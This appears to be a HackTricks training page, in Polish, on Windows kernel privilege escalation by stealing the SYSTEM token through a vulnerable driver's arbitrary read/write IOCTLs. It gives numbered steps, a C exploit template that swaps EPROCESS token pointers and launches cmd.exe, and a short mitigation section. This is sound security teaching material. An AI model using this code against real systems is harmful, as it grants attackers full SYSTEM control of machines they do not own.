# Windows kernel EoP: Token stealing with arbitrary kernel R/W

{{#include ../../banners/hacktricks-training.md}}

## Przegląd

Jeśli podatny sterownik udostępnia IOCTL dający atakującemu dowolne prymitywy kernel read i/lub write, eskalacja do NT AUTHORITY\SYSTEM często jest możliwa przez kradzież tokena SYSTEM. Technika kopiuje wskaźnik Token z EPROCESS procesu SYSTEM do EPROCESS bieżącego procesu.

Dlaczego to działa:
- Każdy proces ma strukturę EPROCESS, która zawiera (między innymi polami) Token (w rzeczywistości EX_FAST_REF do obiektu token).
- Proces SYSTEM (PID 4) posiada token ze wszystkimi włączonymi uprawnieniami.
- Zamiana EPROCESS.Token bieżącego procesu na wskaźnik tokena SYSTEM sprawia, że bieżący proces natychmiast działa jako SYSTEM.

> Offsets w EPROCESS różnią się między wersjami Windows. Określaj je dynamicznie (symbols) lub używaj stałych specyficznych dla wersji. Pamiętaj też, że EPROCESS.Token jest EX_FAST_REF (niskie 3 bity to flagi licznika referencji).

## Kroki wysokiego poziomu

1) Zlokalizuj bazę ntoskrnl.exe i rozwiąż adres PsInitialSystemProcess.
- Z poziomu user mode użyj NtQuerySystemInformation(SystemModuleInformation) lub EnumDeviceDrivers, aby uzyskać bazy załadowanych sterowników.
- Dodaj offset PsInitialSystemProcess (z symbols/reversing) do bazy jądra, aby uzyskać jego adres.
2) Odczytaj wskaźnik pod PsInitialSystemProcess → to jest wskaźnik kernelowy do EPROCESS SYSTEM.
3) Z EPROCESS SYSTEM odczytaj offsety UniqueProcessId i ActiveProcessLinks, aby przeszukać dwukierunkową listę EPROCESS (ActiveProcessLinks.Flink/Blink) aż znajdziesz EPROCESS, którego UniqueProcessId równa się GetCurrentProcessId(). Zachowaj oba:
- EPROCESS_SYSTEM (dla SYSTEM)
- EPROCESS_SELF (dla bieżącego procesu)
4) Odczytaj wartość tokena SYSTEM: Token_SYS = *(EPROCESS_SYSTEM + TokenOffset).
- Wymaskuj niskie 3 bity: Token_SYS_masked = Token_SYS & ~0xF (zwykle ~0xF lub ~0x7 w zależności od build; na x64 używane są niskie 3 bity — maska 0xFFFFFFFFFFFFFFF8).
5) Opcja A (powszechna): Zachowaj niskie 3 bity z twojego bieżącego tokena i dołącz je do wskaźnika SYSTEM, aby utrzymać zgodność osadzonego licznika referencji.
- Token_ME = *(EPROCESS_SELF + TokenOffset)
- Token_NEW = (Token_SYS_masked | (Token_ME & 0x7))
6) Zapisz Token_NEW z powrotem do (EPROCESS_SELF + TokenOffset) używając swojego kernel write primitive.
7) Twój bieżący proces jest teraz SYSTEM. Opcjonalnie uruchom nowy cmd.exe lub powershell.exe, aby to potwierdzić.

## Pseudokod

Poniżej szkic, który używa tylko dwóch IOCTL z podatnego sterownika, jednego do 8-bajtowego kernel read i jednego do 8-bajtowego kernel write. Zastąp interfejsem twojego sterownika.
```c
#include <Windows.h>
#include <Psapi.h>
#include <stdint.h>

// Device + IOCTLs are driver-specific
#define DEV_PATH   "\\\\.\\VulnDrv"
#define IOCTL_KREAD  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_KWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Version-specific (examples only – resolve per build!)
static const uint32_t Off_EPROCESS_UniquePid    = 0x448; // varies
static const uint32_t Off_EPROCESS_Token        = 0x4b8; // varies
static const uint32_t Off_EPROCESS_ActiveLinks  = 0x448 + 0x8; // often UniquePid+8, varies

BOOL kread_qword(HANDLE h, uint64_t kaddr, uint64_t *out) {
struct { uint64_t addr; } in; struct { uint64_t val; } outb; DWORD ret;
in.addr = kaddr; return DeviceIoControl(h, IOCTL_KREAD, &in, sizeof(in), &outb, sizeof(outb), &ret, NULL) && (*out = outb.val, TRUE);
}
BOOL kwrite_qword(HANDLE h, uint64_t kaddr, uint64_t val) {
struct { uint64_t addr, val; } in; DWORD ret;
in.addr = kaddr; in.val = val; return DeviceIoControl(h, IOCTL_KWRITE, &in, sizeof(in), NULL, 0, &ret, NULL);
}

// Get ntoskrnl base (one option)
uint64_t get_nt_base(void) {
LPVOID drivers[1024]; DWORD cbNeeded;
if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded >= sizeof(LPVOID)) {
return (uint64_t)drivers[0]; // first is typically ntoskrnl
}
return 0;
}

int main(void) {
HANDLE h = CreateFileA(DEV_PATH, GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
if (h == INVALID_HANDLE_VALUE) return 1;

// 1) Resolve PsInitialSystemProcess
uint64_t nt = get_nt_base();
uint64_t PsInitialSystemProcess = nt + /*offset of symbol*/ 0xDEADBEEF; // resolve per build

// 2) Read SYSTEM EPROCESS
uint64_t EPROC_SYS; kread_qword(h, PsInitialSystemProcess, &EPROC_SYS);

// 3) Walk ActiveProcessLinks to find current EPROCESS
DWORD myPid = GetCurrentProcessId();
uint64_t cur = EPROC_SYS; // list is circular
uint64_t EPROC_ME = 0;
do {
uint64_t pid; kread_qword(h, cur + Off_EPROCESS_UniquePid, &pid);
if ((DWORD)pid == myPid) { EPROC_ME = cur; break; }
uint64_t flink; kread_qword(h, cur + Off_EPROCESS_ActiveLinks, &flink);
cur = flink - Off_EPROCESS_ActiveLinks; // CONTAINING_RECORD
} while (cur != EPROC_SYS);

// 4) Read tokens
uint64_t tok_sys, tok_me;
kread_qword(h, EPROC_SYS + Off_EPROCESS_Token, &tok_sys);
kread_qword(h, EPROC_ME  + Off_EPROCESS_Token, &tok_me);

// 5) Mask EX_FAST_REF low bits and splice refcount bits
uint64_t tok_sys_mask = tok_sys & ~0xF; // or ~0x7 on some builds
uint64_t tok_new = tok_sys_mask | (tok_me & 0x7);

// 6) Write back
kwrite_qword(h, EPROC_ME + Off_EPROCESS_Token, tok_new);

// 7) We are SYSTEM now
system("cmd.exe");
return 0;
}
```
Notatki:
- Przesunięcia: Użyj WinDbg’s `dt nt!_EPROCESS` z docelowymi PDBs, lub runtime symbol loaderem, aby uzyskać poprawne offsets. Nie hardkoduj na ślepo.
- Maska: Na x64 token jest EX_FAST_REF; dolne 3 bity są bitami licznika referencji. Zachowanie oryginalnych dolnych bitów w twoim tokenie zapobiega natychmiastowym niespójnościom refcount.
- Stabilność: Preferuj podniesienie uprawnień bieżącego procesu; jeśli podniesiesz krótkożyjący helper, możesz stracić SYSTEM, gdy się zakończy.

## Wykrywanie i łagodzenie
- Przyczyną jest ładowanie niepodpisanych lub nieufanych sterowników firm trzecich, które udostępniają potężne IOCTLs.
- Kernel Driver Blocklist (HVCI/CI), DeviceGuard oraz reguły Attack Surface Reduction mogą zapobiegać ładowaniu podatnych sterowników.
- EDR może monitorować podejrzane sekwencje IOCTL implementujące arbitrary read/write oraz token swaps.

## References
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)
- [FuzzySecurity – Windows Kernel ExploitDev (token stealing examples)](https://www.fuzzysecurity.com/tutorials/expDev/17.html)

{{#include ../../banners/hacktricks-training.md}}
